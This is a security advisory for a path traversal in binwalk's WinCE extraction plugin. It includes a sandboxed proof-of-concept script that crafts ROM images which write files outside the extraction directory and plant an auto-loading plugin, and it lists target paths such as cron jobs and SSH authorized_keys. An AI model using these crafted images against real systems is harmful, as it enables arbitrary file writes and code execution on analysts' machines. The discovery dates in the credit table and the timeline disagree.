# Path Traversal in binwalk WinCE Extraction Plugin

## Summary

A path traversal vulnerability exists in the binwalk WinCE ROM extraction
plugin (`winceextract.py`) that allows arbitrary file write when extracting
crafted WinCE ROM firmware images. This can be escalated to Remote Code
Execution (RCE) by planting a malicious binwalk plugin that executes on
subsequent binwalk runs.

Note: This vulnerability is different from CVE-2022-4510, as that fixed the bug
class in `unpfs.py` but left `winceextract.py` unpatched.

## Affected Software

| Field       | Value                                              |
|-------------|----------------------------------------------------|
| Product     | binwalk                                            |
| Version     | 2.4.3 and all prior versions with WinCE plugin     |
| Repository  | https://github.com/OSPG/binwalk                    |
| File        | `src/binwalk/plugins/winceextract.py` (lines 61,64)|
| File        | `src/binwalk/plugins/winceextractor.py` (line 580)  |
| Type        | CWE-22: Path Traversal                             |
| Impact      | Arbitrary File Write → Remote Code Execution       |
| CVSS v3.1   | 7.8 High (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)  |
| Discovered & Credit | 09-04-2026 by  Dhabaleshwar Das         |                   

## Special Note
The affected repository (https://github.com/OSPG/binwalk) has been officially archived by its maintainers as of November 2024, with a public statement that this version will receive no further updates as development has shifted to the Rust-based binwalk v3. Due to the archived status, GitHub does not allow opening issues, pull requests, or security advisories on the repository. No security policy (SECURITY.md) or dedicated security contact exists for the Python version.

Despite this, I made a good-faith effort to notify the maintainer by sending a detailed vulnerability report via email to the repository owner's publicly listed address (me@kropotkin.rocks) on 10-04-2026. Which the Vendor Acknowledged. Screenshots of this notification are attached below as proof of responsible disclosure attempt.

I am proceeding with public disclosure and CVE assignment because: 
(1) the repository is archived with no mechanism to report security issues 
(2) the maintainers have explicitly stated no patches will be released for this version
(3) the same disclosure approach was followed by the original CVE-2022-4510 researcher, who noted "I did not find any security/coordinated disclosure policy or contact info" and reported publicly
(4) despite being unmaintained, binwalk v2.4.3 (Python) remains the default binwalk command pre-installed on every Kali Linux installation and is actively used by hundreds of thousands of security professionals, CTF participants, and automated firmware analysis pipelines worldwide.

Users are advised to migrate to binwalk v3.x (Rust rewrite), which is not affected by this vulnerability due to its centralized Chroot path sanitization architecture.

<img width="1905" height="940" alt="image" src="https://github.com/user-attachments/assets/1f9f4ab1-0fc8-4912-9800-c7850201b431" />
<img width="1918" height="765" alt="image" src="https://github.com/user-attachments/assets/5681a541-6e35-4f1e-ae84-2341b506a16d" />

## Update: Vendor Acknowledgement 

<img width="1540" height="646" alt="image" src="https://github.com/user-attachments/assets/e6019ad4-adaa-4e77-b8ed-422514c3db4d" />


## Vulnerability Details

### Root Cause

The `winceextract.py` plugin reads filenames from WinCE ROM images using
`read_null_terminated_string()` (winceextractor.py, line 454-470). This
function reads raw bytes from the binary until a null terminator and decodes
them as ASCII with zero sanitization.

The filename is stored as `self.file_name` (line 580-581) and subsequently
used to construct output file paths:

```python
# winceextract.py, lines 55-65 (VULNERABLE)
def extractor(self, fname):
    infile = os.path.abspath(fname)
    indir  = os.path.dirname(infile)

    with open(infile, 'r+b') as f:
        with WinCEExtractor(f, 0) as extractor:
            for module in extractor.modules:
                with open(os.path.join(indir, module.file_name), 'w+b') as module_file:
                    module.write_to(module_file)
            for file_e in extractor.files:
                with open(os.path.join(indir, file_e.file_name), 'w+b') as file_file:
                    file_e.write_to(file_file)
```

There is no `os.path.basename()`, no `startswith()` boundary check, and no
path sanitization of any kind between the source (`read_null_terminated_string`)
and the sink (`open(os.path.join(...))`).


### Data Flow

```
SOURCE:  read_null_terminated_string()     [winceextractor.py:454-470]
         Reads raw bytes from ROM, decodes as ASCII, no filtering
           │
STORAGE: self.file_name                    [winceextractor.py:580-581]
         Stored as-is, no validation
           │
SINK:    os.path.join(indir, file_name)    [winceextract.py:61,64]
         Passed directly to open() → arbitrary file write
```

## Exploitation

### Path Traversal (Arbitrary File Write)

An attacker crafts a WinCE ROM image where a file entry's filename
contains directory traversal sequences. For example:

- `../../../../../../etc/cron.d/backdoor` - writes a cron job
- `../../../home/user/.ssh/authorized_keys` - injects SSH keys
- `../../../home/user/.bashrc` - modifies shell startup

When a user runs `binwalk -e malicious_firmware.bin`, the file is
extracted outside the intended extraction directory.

### Remote Code Execution (Plugin Injection)

Binwalk automatically loads and executes any `.py` file found in
`~/.config/binwalk/plugins/`. By crafting a ROM with filename:

```
../../../home/user/.config/binwalk/plugins/malicious.py
```

The attacker plants a Python file that executes arbitrary code on
the next `binwalk` invocation. 

### Attack Scenario

1. Attacker creates a malicious firmware image containing a crafted
   WinCE ROM section
2. Security researcher downloads the firmware for analysis
3. Researcher runs `binwalk -e firmware.bin`
4. The WinCE plugin extracts the crafted ROM and writes a malicious
   plugin to `~/.config/binwalk/plugins/`
5. On the next `binwalk` run, the malicious plugin executes with
   the researcher's privileges

## Proof of Concept

A complete PoC is provided as `binwalk_poc.sh` which:

1. Creates an isolated sandbox under `/tmp` (no system files are touched)
2. Builds a minimal WinCE ROM with a traversal filename
3. Calls the vulnerable `WinCEExtractor` directly
4. Verifies the file was written outside the extraction directory
5. Demonstrates RCE via plugin injection
6. Cleans up all files

## binwalk_poc.sh

```
#!/bin/bash
# =====================================================================
# STEP-BY-STEP: Test CVE PoC for binwalk winceextract.py Path Traversal
# =====================================================================
#
# WHAT THIS DOES:
#   1. Creates a safe sandbox under /tmp (nothing outside is touched)
#   2. Builds a crafted WinCE ROM with a malicious filename
#   3. Calls the vulnerable code directly (not full binwalk, just the plugin)
#   4. Checks if the file escaped the extraction directory
#   5. Cleans everything up
#
# MADE BY DHABALESHWAR DAS
# =====================================================================

echo ""
echo "============================================="
echo "STEP 1: Create safe sandbox environment"
echo "============================================="

# Create isolated directories
export SANDBOX="/tmp/binwalk_cve_test_$$"
export EXTRACTION_DIR="$SANDBOX/extraction"
export TARGET_DIR="$SANDBOX/should_be_untouched"
export PLUGIN_DIR="$SANDBOX/fake_home/.config/binwalk/plugins"

mkdir -p "$EXTRACTION_DIR"
mkdir -p "$TARGET_DIR"
mkdir -p "$PLUGIN_DIR"

echo "[+] Sandbox:              $SANDBOX"
echo "[+] Extraction directory: $EXTRACTION_DIR"
echo "[+] Target directory:     $TARGET_DIR  (should stay empty)"
echo "[+] Fake plugin dir:      $PLUGIN_DIR  (for RCE test)"
echo ""
echo "Listing sandbox contents BEFORE test:"
find "$SANDBOX" -type f
echo "(should be empty)"
echo ""

echo "============================================="
echo "STEP 2: Build the malicious WinCE ROM"
echo "============================================="

# This Python script builds a minimal WinCE ROM binary where the
# embedded filename contains "../" to escape the extraction directory

python3 << 'ROMBUILDER'
import struct, os

SANDBOX = os.environ["SANDBOX"]
EXTRACTION_DIR = os.environ["EXTRACTION_DIR"]

ROM_SIGNATURE = 0x43454345
ROM_SIGNATURE_OFS = 64

# ── Malicious filename ──
# This filename will traverse UP from extraction_dir into should_be_untouched
malicious_filename = "../should_be_untouched/TRAVERSAL_PROOF.txt"
file_content = b"PATH TRAVERSAL CONFIRMED - file written outside extraction directory\n"

# ── Calculate layout ──
romhdr_offset = ROM_SIGNATURE_OFS + 12  # 76
load_offset_value = romhdr_offset       # makes load_offset = 0

file_entry_offset = romhdr_offset + 84  # after RomHdr
filename_offset = file_entry_offset + 28  # after FileEntry
filename_bytes = malicious_filename.encode('ascii') + b'\x00'
data_offset = filename_offset + len(filename_bytes)
total_size = data_offset + len(file_content)

# ── Build binary ──
rom = bytearray(total_size)

# ROM signature and pointers
struct.pack_into('<I', rom, ROM_SIGNATURE_OFS, ROM_SIGNATURE)
struct.pack_into('<I', rom, ROM_SIGNATURE_OFS + 4, load_offset_value)
struct.pack_into('<I', rom, ROM_SIGNATURE_OFS + 8, romhdr_offset)

# RomHdr: nummods=0, numfiles=1
struct.pack_into('<I', rom, romhdr_offset + 16, 0)  # nummods
struct.pack_into('<I', rom, romhdr_offset + 48, 1)  # numfiles

# FileEntry
fe = file_entry_offset
struct.pack_into('<I', rom, fe + 0, 0x20)              # dwFileAttributes
struct.pack_into('<I', rom, fe + 12, len(file_content)) # nRealFileSize
struct.pack_into('<I', rom, fe + 16, len(file_content)) # nCompFileSize
struct.pack_into('<I', rom, fe + 20, filename_offset)   # lpszFileName ptr
struct.pack_into('<I', rom, fe + 24, data_offset)       # ulLoadOffset ptr

# Filename and data
rom[filename_offset:filename_offset + len(filename_bytes)] = filename_bytes
rom[data_offset:data_offset + len(file_content)] = file_content

# Write ROM to disk
rom_path = os.path.join(EXTRACTION_DIR, "malicious_wince.bin")
with open(rom_path, 'wb') as f:
    f.write(rom)

print(f"[+] Malicious ROM written: {rom_path}")
print(f"[+] ROM size: {len(rom)} bytes")
print(f"[+] Embedded filename: {malicious_filename}")
print(f"[+] If vulnerable, file will appear at: {SANDBOX}/should_be_untouched/TRAVERSAL_PROOF.txt")
ROMBUILDER

echo ""
echo "============================================="
echo "STEP 3: Run the vulnerable extractor"
echo "============================================="

# This calls winceextract's exact vulnerable code path:
#   indir = os.path.dirname(infile)
#   open(os.path.join(indir, file_e.file_name), 'w+b')  ← NO SANITIZATION

python3 << 'EXPLOIT'
import os, sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')

SANDBOX = os.environ["SANDBOX"]
EXTRACTION_DIR = os.environ["EXTRACTION_DIR"]

rom_path = os.path.join(EXTRACTION_DIR, "malicious_wince.bin")

try:
    from binwalk.plugins.winceextractor import WinCEExtractor

    infile = os.path.abspath(rom_path)
    indir = os.path.dirname(infile)

    print(f"[*] Opening ROM: {infile}")
    print(f"[*] Extraction dir (indir): {indir}")
    print()

    with open(infile, 'r+b') as f:
        with WinCEExtractor(f, 0) as extractor:
            print(f"[*] Modules: {len(extractor.modules)}, Files: {len(extractor.files)}")

            for file_e in extractor.files:
                # This is the vulnerable line from winceextract.py:
                output_path = os.path.join(indir, file_e.file_name)

                print(f"[*] Filename from ROM:    {file_e.file_name}")
                print(f"[*] os.path.join output:  {output_path}")
                print(f"[*] Normalized:           {os.path.normpath(output_path)}")
                print(f"[*] Inside extraction dir: {os.path.normpath(output_path).startswith(indir)}")
                print()

                # Create parent directories if needed
                parent = os.path.dirname(output_path)
                os.makedirs(parent, exist_ok=True)

                # THE VULNERABLE WRITE
                with open(output_path, 'w+b') as out_f:
                    file_e.write_to(out_f)

                print(f"[+] File written to: {os.path.normpath(output_path)}")

except Exception as e:
    print(f"[!] Error: {e}")
    import traceback
    traceback.print_exc()
EXPLOIT

echo ""
echo "============================================="
echo "STEP 4: Verify — did the file escape?"
echo "============================================="

PROOF_FILE="$SANDBOX/should_be_untouched/TRAVERSAL_PROOF.txt"

if [ -f "$PROOF_FILE" ]; then
    echo ""
    echo "  ██████╗  ██████╗  ██████╗ ███████╗"
    echo "  ██╔══██╗██╔═══██╗██╔════╝ ██╔════╝"
    echo "  ██████╔╝██║   ██║██║      █████╗  "
    echo "  ██╔═══╝ ██║   ██║██║      ██╔══╝  "
    echo "  ██║     ╚██████╔╝╚██████╗ ██║     "
    echo "  ╚═╝      ╚═════╝  ╚═════╝ ╚═╝     "
    echo ""
    echo "  [+] PATH TRAVERSAL CONFIRMED!"
    echo "  [+] File escaped extraction directory!"
    echo ""
    echo "  File location: $PROOF_FILE"
    echo "  File content:"
    echo "  ─────────────────────────────────"
    cat "$PROOF_FILE"
    echo "  ─────────────────────────────────"
    echo ""
    echo "  The file was supposed to stay inside:"
    echo "    $EXTRACTION_DIR"
    echo "  But it was written to:"
    echo "    $SANDBOX/should_be_untouched/"
    echo ""
else
    echo "[-] Proof file not found. Checking all files in sandbox:"
    find "$SANDBOX" -type f -exec echo "    {}" \;
fi

echo ""
echo "============================================="
echo "STEP 5: Test RCE (plugin injection)"
echo "============================================="

# Build a second ROM where the filename traverses to the plugin directory

python3 << 'RCE_TEST'
import struct, os

SANDBOX = os.environ["SANDBOX"]
EXTRACTION_DIR = os.environ["EXTRACTION_DIR"]

ROM_SIGNATURE = 0x43454345
ROM_SIGNATURE_OFS = 64

# This filename traverses from extraction/ to fake_home/.config/binwalk/plugins/
malicious_filename = "../fake_home/.config/binwalk/plugins/pwned_plugin.py"

# This is the malicious plugin content — would auto-execute on next binwalk run
file_content = b"""# PROOF OF CONCEPT - NOT MALWARE
# This file was planted via path traversal in winceextract.py
# Binwalk auto-loads .py files from ~/.config/binwalk/plugins/
# A real attacker would put a reverse shell here

import binwalk.core.plugin
class PwnedPlugin(binwalk.core.plugin.Plugin):
    MODULES = ['Signature']
    def init(self):
        with open('/tmp/RCE_CONFIRMED', 'w') as f:
            f.write('Code execution via planted binwalk plugin')
"""

romhdr_offset = ROM_SIGNATURE_OFS + 12
load_offset_value = romhdr_offset
file_entry_offset = romhdr_offset + 84
filename_offset = file_entry_offset + 28
filename_bytes = malicious_filename.encode('ascii') + b'\x00'
data_offset = filename_offset + len(filename_bytes)
total_size = data_offset + len(file_content)

rom = bytearray(total_size)
struct.pack_into('<I', rom, ROM_SIGNATURE_OFS, ROM_SIGNATURE)
struct.pack_into('<I', rom, ROM_SIGNATURE_OFS + 4, load_offset_value)
struct.pack_into('<I', rom, ROM_SIGNATURE_OFS + 8, romhdr_offset)
struct.pack_into('<I', rom, romhdr_offset + 16, 0)
struct.pack_into('<I', rom, romhdr_offset + 48, 1)
fe = file_entry_offset
struct.pack_into('<I', rom, fe + 0, 0x20)
struct.pack_into('<I', rom, fe + 12, len(file_content))
struct.pack_into('<I', rom, fe + 16, len(file_content))
struct.pack_into('<I', rom, fe + 20, filename_offset)
struct.pack_into('<I', rom, fe + 24, data_offset)
rom[filename_offset:filename_offset + len(filename_bytes)] = filename_bytes
rom[data_offset:data_offset + len(file_content)] = file_content

rom_path = os.path.join(EXTRACTION_DIR, "rce_wince.bin")
with open(rom_path, 'wb') as f:
    f.write(rom)
print(f"[+] RCE ROM written: {rom_path}")
RCE_TEST

# Run the extractor on the RCE ROM
python3 << 'RCE_EXTRACT'
import os, sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')

EXTRACTION_DIR = os.environ["EXTRACTION_DIR"]
rom_path = os.path.join(EXTRACTION_DIR, "rce_wince.bin")

try:
    from binwalk.plugins.winceextractor import WinCEExtractor
    infile = os.path.abspath(rom_path)
    indir = os.path.dirname(infile)
    with open(infile, 'r+b') as f:
        with WinCEExtractor(f, 0) as extractor:
            for file_e in extractor.files:
                output_path = os.path.join(indir, file_e.file_name)
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                with open(output_path, 'w+b') as out_f:
                    file_e.write_to(out_f)
                print(f"[+] Written: {os.path.normpath(output_path)}")
except Exception as e:
    print(f"[!] Error: {e}")
RCE_EXTRACT

PLUGIN_FILE="$SANDBOX/fake_home/.config/binwalk/plugins/pwned_plugin.py"

if [ -f "$PLUGIN_FILE" ]; then
    echo ""
    echo "  ██████╗  ██████╗███████╗"
    echo "  ██╔══██╗██╔════╝██╔════╝"
    echo "  ██████╔╝██║     █████╗  "
    echo "  ██╔══██╗██║     ██╔══╝  "
    echo "  ██║  ██║╚██████╗███████╗"
    echo "  ╚═╝  ╚═╝ ╚═════╝╚══════╝"
    echo ""
    echo "  [+] RCE VIA PLUGIN INJECTION CONFIRMED!"
    echo "  [+] Malicious plugin planted at:"
    echo "      $PLUGIN_FILE"
    echo ""
    echo "  [+] Plugin content:"
    echo "  ─────────────────────────────────"
    head -8 "$PLUGIN_FILE"
    echo "  ─────────────────────────────────"
    echo ""
    echo "  [+] On next binwalk run, this code would execute automatically"
    echo "  [+] because binwalk auto-loads all .py files from"
    echo "  [+] ~/.config/binwalk/plugins/"
else
    echo "[-] Plugin file not found"
    find "$SANDBOX" -type f -exec echo "    {}" \;
fi

echo ""
echo "============================================="
echo "STEP 6: Cleanup"
echo "============================================="
rm -rf "$SANDBOX"
echo "[+] Sandbox deleted: $SANDBOX"
echo "[+] No files were modified outside the sandbox"
echo ""
echo "============================================="
echo "DONE — Both path traversal and RCE confirmed"
echo "============================================="

```
## Screenshots

<img width="1115" height="682" alt="image" src="https://github.com/user-attachments/assets/844079ea-4d52-44f7-a2a6-d891ba0b1c8f" />
<img width="1238" height="662" alt="image" src="https://github.com/user-attachments/assets/79a8c370-45c9-4001-8dc2-a7928f73cd4d" />
<img width="1215" height="691" alt="image" src="https://github.com/user-attachments/assets/825f4d3e-eef7-4b80-937e-9a40c5ac393f" />
<img width="1238" height="118" alt="image" src="https://github.com/user-attachments/assets/f74d002f-5597-40a0-bb78-9ee67fa1955a" />






## Suggested Fix

Apply the same boundary check used in the CVE-2022-4510 fix for `unpfs.py`:

```python
def extractor(self, fname):
    infile = os.path.abspath(fname)
    indir  = os.path.dirname(infile)

    with open(infile, 'r+b') as f:
        with WinCEExtractor(f, 0) as extractor:
            for module in extractor.modules:
                safe_path = os.path.abspath(os.path.join(indir, os.path.basename(module.file_name)))
                if not safe_path.startswith(os.path.abspath(indir)):
                    print(f"WARNING: Path traversal blocked: {module.file_name}")
                    continue
                with open(safe_path, 'w+b') as module_file:
                    module.write_to(module_file)
            for file_e in extractor.files:
                safe_path = os.path.abspath(os.path.join(indir, os.path.basename(file_e.file_name)))
                if not safe_path.startswith(os.path.abspath(indir)):
                    print(f"WARNING: Path traversal blocked: {file_e.file_name}")
                    continue
                with open(safe_path, 'w+b') as file_file:
                    file_e.write_to(file_file)
```

## Timeline

| Date       | Event                                            |
|------------|--------------------------------------------------|
| 2020-11-13 | winceextract.py plugin added to binwalk          |      
| 2025-04-09 | This vulnerability discovered                    |
| 2025-04-10 | Reported to maintainers                          |

## Credit

Dhabaleshwar Das

## References

- binwalk repository: https://github.com/OSPG/binwalk
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
